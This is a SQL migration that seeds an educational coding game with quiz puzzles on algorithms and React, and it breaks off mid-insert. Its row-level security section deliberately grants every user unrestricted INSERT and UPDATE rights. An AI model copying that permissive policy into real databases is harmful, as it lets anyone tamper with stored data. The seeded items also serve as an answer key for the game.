-- ==============================================================================
-- Abyss Sentinel Mainframe - Master Question Bank Migration
-- Generated at: 2026-09-11T12:29:49.292Z
-- Total Puzzles: 70
-- Covers all 5 Curriculum Domains, 4 Difficulty Tiers, and Sectors 1-5 (Slots 1-14)
-- ==============================================================================

-- 1. Ensure Table Exists
CREATE TABLE IF NOT EXISTS public.generated_questions (
  id TEXT PRIMARY KEY,
  question TEXT NOT NULL,
  domain TEXT NOT NULL DEFAULT 'Programming Fundamentals',
  tags TEXT[] NOT NULL DEFAULT '{}',
  difficulty TEXT NOT NULL DEFAULT 'Easy' CHECK (difficulty IN ('Easy', 'Intermediate', 'Advanced', 'Expert')),
  title TEXT,
  scenario TEXT,
  code_snippet TEXT,
  answer TEXT[] NOT NULL DEFAULT '{}',
  hint TEXT,
  explanation TEXT,
  sector_level INTEGER NOT NULL DEFAULT 1,
  created_by UUID REFERENCES auth.users(id) ON DELETE SET NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Safely allow TEXT or UUID id compatibility
DO $$ 
BEGIN 
  BEGIN
    ALTER TABLE public.generated_questions ALTER COLUMN id TYPE TEXT;
  EXCEPTION 
    WHEN others THEN NULL;
  END;
END $$;

-- 2. Configure Permissive Row Level Security Policies
ALTER TABLE public.generated_questions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Public can view generated questions" ON public.generated_questions;
CREATE POLICY "Public can view generated questions" 
ON public.generated_questions FOR SELECT 
USING (true);

DROP POLICY IF EXISTS "Anyone can insert generated questions" ON public.generated_questions;
CREATE POLICY "Anyone can insert generated questions" 
ON public.generated_questions FOR INSERT 
WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update generated questions" ON public.generated_questions;
CREATE POLICY "Anyone can update generated questions" 
ON public.generated_questions FOR UPDATE 
USING (true);

-- 3. Optimized Query Indexes
CREATE INDEX IF NOT EXISTS idx_questions_domain ON public.generated_questions(domain);
CREATE INDEX IF NOT EXISTS idx_questions_difficulty ON public.generated_questions(difficulty);
CREATE INDEX IF NOT EXISTS idx_questions_domain_difficulty ON public.generated_questions(domain, difficulty);
CREATE INDEX IF NOT EXISTS idx_questions_sector ON public.generated_questions(sector_level);
CREATE INDEX IF NOT EXISTS idx_questions_tags ON public.generated_questions USING GIN(tags);

-- 4. Seed Questions Population
INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000001', 'Which algorithmic pattern uses two boundaries moving across a contiguous array to compute running window statistics in linear O(N) time?', 'Data Structures & Algorithms', ARRAY['dsa', 'arrays', 'sliding-window', 'two-pointer', 'sector-1']::text[], 'Easy', 'The Sliding Window Threshold', 'The laboratory terminal is buffering high-frequency seismic telemetry, crashing the memory bus with an O(N^2) brute force loop.', 'function maxSubarray(arr, k) {
  let windowSum = 0;
  for (let i = 0; i < k; i++) windowSum += arr[i];
  let maxSum = windowSum;
  for (let i = k; i < arr.length; i++) {
    windowSum += arr[i] - arr[i - k]; // WHAT ALGORITHM PATTERN IS THIS?
    maxSum = Math.max(maxSum, windowSum);
  }
  return maxSum;
}', ARRAY['sliding window', 'sliding window technique', 'sliding window algorithm', 'sliding-window']::text[], 'A rectangular glass pane that shifts across the array frame by frame.', 'The sliding window technique tracks a continuous range of elements, adding the incoming element and subtracting the evicted one in O(1) time.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000002', 'In Floyd''s cycle-finding algorithm, how many steps does the faster "hare" pointer advance on each iteration relative to the "tortoise"?', 'Data Structures & Algorithms', ARRAY['dsa', 'linked-list', 'pointers', 'cycle-detection', 'floyd', 'sector-1']::text[], 'Easy', 'The Pointer Cycle Anomaly', 'A corrupted singly linked list in the drawer lock circuits enters an infinite looping pointer cycle.', 'let slow = head;
let fast = head;
while (fast && fast.next) {
  slow = slow.next;
  fast = fast.next.next; // How many nodes forward?
  if (slow === fast) return true; // Cycle detected
}', ARRAY['2', 'two', '2 steps', 'two nodes', '2 nodes']::text[], 'The hare moves at double the velocity of the tortoise.', 'Floyd''s Cycle-Finding Algorithm uses two pointers moving at speeds of 1 and 2 nodes per step to detect closed loops in O(N) time and O(1) space.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000003', 'What essential structural condition is missing from a recursive function to stop it from invoking itself forever?', 'Data Structures & Algorithms', ARRAY['dsa', 'recursion', 'call-stack', 'base-case', 'sector-1']::text[], 'Easy', 'The Recursive Stack Collapse', 'Sector 1 exit security subroutine is stuck in unbounded recursion, causing a fatal Call Stack Size Exceeded crash.', 'function traverseSector(node) {
  // FATAL: Missing condition that checks if node is null!
  traverseSector(node.left);
  traverseSector(node.right);
}', ARRAY['base case', 'base condition', 'a base case', 'termination condition', 'base-case']::text[], 'The foundation on which every recursive tree stops branching downward.', 'Every recursive algorithm requires a base case to terminate call frames before exceeding OS stack allocation boundaries.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000004', 'Which tree traversal order visits nodes in the sequence Left Subtree -> Root Node -> Right Subtree to yield sorted keys in a BST?', 'Data Structures & Algorithms', ARRAY['dsa', 'trees', 'bst', 'in-order', 'binary-tree', 'sector-2']::text[], 'Intermediate', 'The Sorted Tree Invariant', 'The server rack indexing binary search tree needs its keys read in ascending sequence to unlock the vault bus.', 'function traverse(node) {
  if (!node) return;
  traverse(node.left);
  emitKey(node.value); // Processed in sorted order
  traverse(node.right);
}', ARRAY['in-order', 'inorder', 'in order', 'in-order traversal', 'inorder traversal']::text[], 'The node is visited right "in" the middle of its two children.', 'In-order traversal of a valid Binary Search Tree processes keys in strictly non-decreasing sorted order.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000005', 'Which linear data structure (FIFO) must Breadth-First Search (BFS) utilize to explore graph vertices in level order?', 'Data Structures & Algorithms', ARRAY['dsa', 'bfs', 'queue', 'graphs', 'shortest-path', 'sector-2']::text[], 'Intermediate', 'The Level-Order Buffer Breach', 'The network router is routing escape pods through the shortest unweighted path using level-by-level breadth exploration.', 'const exploration = [];
exploration.push(startNode);
while (exploration.length > 0) {
  const current = exploration.shift(); // First In, First Out
  // WHAT DATA STRUCTURE IS THIS?
}', ARRAY['queue', 'fifo queue', 'a queue']::text[], 'People standing in a queue waiting to be served in arrival order.', 'BFS relies on a FIFO queue to discover graph nodes in order of their edge distance from the root vertex.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000006', 'What optimization technique records the return values of expensive subproblems in a cache to prevent redundant recursive calculations?', 'Data Structures & Algorithms', ARRAY['dsa', 'dynamic-programming', 'memoization', 'optimization', 'sector-2']::text[], 'Intermediate', 'The Exponential Tree Pruner', 'Sector 2 blast door pathfinding is recalculating the same subproblems 2^N times, starving the mainframe clock.', 'const cache = {};
function solve(n) {
  if (n in cache) return cache[n]; // Return stored result
  const result = solve(n - 1) + solve(n - 2);
  cache[n] = result;
  return result;
}', ARRAY['memoization', 'memoize', 'caching', 'dynamic programming', 'memo']::text[], 'Writing a reminder or "memo" of answers you have previously computed.', 'Memoization stores top-down subproblem evaluations in lookup tables, transforming exponential O(2^N) recursion into linear O(N) operations.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000007', 'What collection structure is used during Depth-First Search (DFS) traversal to track nodes currently in the active recursion call stack?', 'Data Structures & Algorithms', ARRAY['dsa', 'dfs', 'graphs', 'cycle-detection', 'backtracking', 'sector-3']::text[], 'Advanced', 'The Spectral Cycle Hunt', 'Coolant routing valves form a directed dependency graph. An unhandled cycle will cause the coolant pump to deadlock.', 'function hasCycle(node, visited, recursionStack) {
  visited.add(node);
  recursionStack.add(node);
  for (const neighbor of graph[node]) {
    if (recursionStack.has(neighbor)) return true; // Cycle found
  }
  recursionStack.delete(node); // Backtrack
  return false;
}', ARRAY['set', 'hash set', 'hashset', 'recursion stack', 'visited set']::text[], 'An unordered collection with O(1) element lookup and unique values.', 'A Hash Set provides O(1) membership testing to detect back-edges to ancestor vertices in the active recursion stack during DFS.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000008', 'To prevent 32-bit signed integer overflow when calculating mid in binary search, how should mid be computed instead of (low + high) / 2?', 'Data Structures & Algorithms', ARRAY['dsa', 'binary-search', 'overflow', 'arithmetic', 'sector-3']::text[], 'Advanced', 'The Logarithmic Midpoint Guard', 'The reactor shutdown index array has 2 billion elements. A naive binary search midpoint calculation triggers an integer overflow error.', '// OVERFLOW RISK: mid = (low + high) / 2;
// SAFE FORMULA: mid = low + (_______) / 2;', ARRAY['high - low', 'high-low', '(high - low)']::text[], 'Take the distance between high and low, halve it, then add it to low.', 'Calculating `low + (high - low) / 2` mathematically equals `(low + high) / 2` but avoids exceeding the maximum 32-bit integer boundary (2^31 - 1).', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000009', 'What is the theoretical worst-case time complexity of extracting the minimum root element and restoring the heap property in a binary heap with N nodes?', 'Data Structures & Algorithms', ARRAY['dsa', 'heap', 'priority-queue', 'time-complexity', 'sector-4']::text[], 'Advanced', 'The Min-Heap Root Extraction', 'A contaminated memory shard prioritizes anomaly telemetry using a binary min-heap data structure.', 'class MinHeap {
  extractMin() {
    const min = this.heap[0];
    this.heap[0] = this.heap.pop();
    this.siftDown(0); // WHAT IS THE BIG-O RUNTIME OF THIS OPERATION?
    return min;
  }
}', ARRAY['o(log n)', 'o(logn)', 'log n', 'logn', 'o(log(n))']::text[], 'The height of a balanced binary tree determines the sift-down distance.', 'Extracting the root and sifting the replacement node down a binary tree of N elements takes logarithmic time O(log N).', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000010', 'What boolean property is commonly stored on each Trie node to denote that a path from root represents a complete valid stored word?', 'Data Structures & Algorithms', ARRAY['dsa', 'trie', 'prefix-tree', 'strings', 'sector-4']::text[], 'Advanced', 'The Corrupted Prefix Trie', 'Anomaly telemetry classification uses a Trie (prefix tree) to match corrupted biometric callsigns with sub-millisecond latency.', 'class TrieNode {
  constructor() {
    this.children = {};
    this._________ = false; // WHAT BOOLEAN FLAG MARKS WORD COMPLETION?
  }
}', ARRAY['isendofword', 'isend', 'isword', 'is_end_of_word', 'is_end']::text[], 'Indicates the current node is the "end of word".', 'In a Trie, the `isEndOfWord` boolean distinguishes prefixes that are valid stored keys from intermediate substring branches.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000011', 'In Dijkstra''s algorithm, what term describes the step where a shorter newly discovered path to vertex V via U updates distance[V]?', 'Data Structures & Algorithms', ARRAY['dsa', 'dijkstra', 'graphs', 'greedy', 'shortest-path', 'sector-4']::text[], 'Advanced', 'The Weighted Relaxation Matrix', 'Containment gate escape corridors have variable latency edge weights. Dijkstra''s algorithm is resolving the quickest escape path.', 'if (distances[u] + weight < distances[v]) {
  distances[v] = distances[u] + weight;
  // WHAT IS THIS CORE STEP CALLED?
}', ARRAY['relaxation', 'relax', 'edge relaxation', 'relaxing']::text[], 'Tension is released when a tighter, shorter distance bound is discovered.', 'Edge relaxation tests whether the current shortest path estimate to V can be improved by traversing through U.', 4
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000012', 'In Kahn''s algorithm for topological sorting of a Directed Acyclic Graph (DAG), nodes with what in-degree count are initially added to the queue?', 'Data Structures & Algorithms', ARRAY['dsa', 'topological-sort', 'dag', 'graphs', 'kahns-algorithm', 'sector-5']::text[], 'Advanced', 'The Topological Pipeline Deadlock', 'The quantum synthesizer core requires 12 concurrent dependency tasks executed in valid topological dependency sequence.', 'const queue = [];
for (const [node, degree] of inDegree.entries()) {
  if (degree === ___) { // WHAT IN-DEGREE NUMBER QUALIFIES NODES TO START?
    queue.push(node);
  }
}', ARRAY['0', 'zero']::text[], 'A node that depends on nothing has zero prerequisites.', 'Kahn''s algorithm begins by enqueueing all vertices with an in-degree of 0 (no remaining prerequisite incoming edges).', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000013', 'Which bitwise operator has the identity properties A ^ A = 0 and A ^ 0 = A, allowing you to isolate the unique element in linear time?', 'Data Structures & Algorithms', ARRAY['dsa', 'bitwise', 'xor', 'binary', 'bit-manipulation', 'sector-5']::text[], 'Advanced', 'The Bitwise Singularity Invariant', 'An array of biometric tokens contains duplicate pairs except for one solitary anomaly key. Gravity inversion requires finding it in O(1) space.', 'let unique = 0;
for (const num of tokens) {
  unique = unique ___ num; // WHAT BITWISE OPERATOR CANCELS OUT DUPLICATES?
}', ARRAY['^', 'xor', 'bitwise xor', '^ ']::text[], 'The caret symbol in C/JS that represents exclusive OR.', 'Because XOR is commutative, associative, and self-inverting (x ^ x = 0), XORing all numbers cancels identical pairs, leaving the single unique value.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000001-0000-4000-8000-000000000014', 'What optimization in Disjoint Set Union flattens the tree by pointing every traversed node directly to the root during find operations?', 'Data Structures & Algorithms', ARRAY['dsa', 'dsu', 'union-find', 'graphs', 'path-compression', 'sector-5']::text[], 'Expert', 'The Disjoint Union Path Compressor', 'The final singularity portal tracks dynamic connectivity across fractured spacetime clusters using Disjoint Set Union (DSU).', 'function find(x) {
  if (parent[x] !== x) {
    parent[x] = find(parent[x]); // WHAT OPTIMIZATION IS THIS RE-ASSIGNMENT?
  }
  return parent[x];
}', ARRAY['path compression', 'path-compression', 'compression']::text[], 'Compressing the path so future find calls take nearly O(1) amortized time.', 'Path compression flattens the tree structure during find() calls, achieving near-constant alpha(N) inverse Ackermann time complexity.', 5
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000001', 'What React hook returns the current state value and a state setter function to trigger component re-renders?', 'React & Frontend Architecture', ARRAY['react', 'useState', 'hooks', 'state', 'immutability', 'sector-1']::text[], 'Easy', 'The Direct Mutation Glitch', 'The laboratory monitor UI fails to re-render when player sanity depletes because state was mutated directly.', 'const [sanity, setSanity] = ________(100); // WHAT HOOK DECLARES REACTIVE STATE?', ARRAY['usestate', 'usestate()', 'use state', 'react.usestate']::text[], 'It allows functional components to "use" reactive "state".', 'useState is the primary React primitive for state variables; direct mutations (e.g. sanity = 90) fail to trigger virtual DOM reconciliation passes.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000002', 'What should be passed as the second argument to useEffect to guarantee that the effect runs strictly once when the component mounts?', 'React & Frontend Architecture', ARRAY['react', 'useEffect', 'lifecycle', 'dependencies', 'sector-1']::text[], 'Easy', 'The Cascade Re-render Loop', 'The drawer control panel freezes the browser tab in an infinite network request loop inside an unconstrained effect.', 'useEffect(() => {
  initTelemetryStream();
}, /* WHAT ARGUMENT ENSURES RUN ONCE ON MOUNT? */);', ARRAY['[]', 'empty array', 'an empty array', '[] ']::text[], 'Two square brackets with nothing between them.', 'An empty dependency array `[]` signals to React that the effect has no dependencies, scheduling execution solely after the initial commit/mount.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000003', 'What type of value must a useEffect callback return to clean up subscriptions, timers, or event listeners when unmounting?', 'React & Frontend Architecture', ARRAY['react', 'useEffect', 'cleanup', 'memory-leaks', 'listeners', 'sector-1']::text[], 'Intermediate', 'The Phantom Listener Memory Leak', 'Sector 1 exit terminal attaches window keyboard listeners on every re-render without releasing them, crashing memory threads.', 'useEffect(() => {
  const handler = () => pulseBeacon();
  window.addEventListener("keydown", handler);
  return () => window.removeEventListener("keydown", handler); // WHAT IS THIS RETURN VALUE?
}, []);', ARRAY['cleanup function', 'a cleanup function', 'cleanup', 'function', 'a function']::text[], 'A callback designed to clean up and detach side effects.', 'Returning a cleanup function ensures React executes teardown logic before re-running the effect or unmounting the component.', 1
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000004', 'Which React hook returns a mutable object with a ".current" property whose mutations do NOT trigger a component re-render?', 'React & Frontend Architecture', ARRAY['react', 'useRef', 'mutable-state', 'dom-refs', 'sector-2']::text[], 'Intermediate', 'The Persistent Non-Rendering Ref', 'A server rack needs to track animation frame IDs across render passes without causing unwanted UI re-renders.', 'const animId = ________(null);
animId.current = requestAnimationFrame(loop); // DOES NOT TRIGGER RE-RENDER', ARRAY['useref', 'useref()', 'use ref', 'react.useref']::text[], 'Used frequently for direct DOM references or mutable instance variables.', 'useRef stores mutable references that survive across renders without triggering a re-render cycle when modified.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000005', 'What React API pair (createContext and its consumer hook) eliminates prop drilling by broadcasting values across the tree?', 'React & Frontend Architecture', ARRAY['react', 'context', 'useContext', 'state-management', 'prop-drilling', 'sector-2']::text[], 'Intermediate', 'The Prop Drilling Bypass Matrix', 'Operator security clearance data must be shared across ten nested child components without manually forwarding props through every layer.', 'const ClearanceContext = createContext(null);
// Inside deeply nested consumer component:
const clearance = ________(ClearanceContext);', ARRAY['usecontext', 'usecontext()', 'use context', 'react.usecontext']::text[], 'The hook that consumes a React Context.', 'useContext consumes values provided by a Context.Provider higher up in the component tree without intermediary prop drilling.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000006', 'What special reserved prop must be provided to list elements in React to provide elements with a stable identity for the diffing algorithm?', 'React & Frontend Architecture', ARRAY['react', 'reconciliation', 'virtual-dom', 'keys', 'performance', 'sector-2']::text[], 'Intermediate', 'The Reconciliation Identity Key', 'Dynamically generated sensor cards in the blast door HUD lose input focus and re-order unpredictably during array updates.', '{anomalies.map((item) => (
  <SensorCard /* WHAT ESSENTIAL PROP GOES HERE? */={item.id} data={item} />
))}', ARRAY['key', 'key prop', 'key={item.id}']::text[], 'A three-letter word that unlocks unique item identity in virtual DOM diffing.', 'Keys allow React''s reconciliation engine to match elements across renders, avoiding full DOM recreation and state confusion during array mutations.', 2
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
  '00000002-0000-4000-8000-000000000007', 'Which React hook caches a function definition between renders to maintain referential equality across render cycles?', 'React & Frontend Architecture', ARRAY['react', 'useCallback', 'useMemo', 'performance', 'referential-equality', 'sector-3']::text[], 'Advanced', 'The Referential Callback Cache', 'A heavy 3D radar canvas inside the reactor core re-renders on every tick because a callback function reference changes on each render pass.', 'const handleVectorShift = ________(() => {
  updateCoreCoordinates(target);
}, [target]); // Caches function instance', ARRAY['usecallback', 'usecallback()', 'use callback', 'react.usecallback']::text[], 'Similar to useMemo, but specifically caches function references rather than computed values.', 'useCallback preserves referential equality of callbacks passed to memoized child components, preventing unnecessary child re-renders.', 3
)
ON CONFLICT (id) DO UPDATE SET
  question = EXCLUDED.question,
  domain = EXCLUDED.domain,
  tags = EXCLUDED.tags,
  difficulty = EXCLUDED.difficulty,
  title = EXCLUDED.title,
  scenario = EXCLUDED.scenario,
  code_snippet = EXCLUDED.code_snippet,
  answer = EXCLUDED.answer,
  hint = EXCLUDED.hint,
  explanation = EXCLUDED.explanation,
  sector_level = EXCLUDED.sector_level;

INSERT INTO public.generated_questions (
  id, question, domain, tags, difficulty, title, scenario, code_snippet, answer, hint, explanation, sector_level
) VALUES (
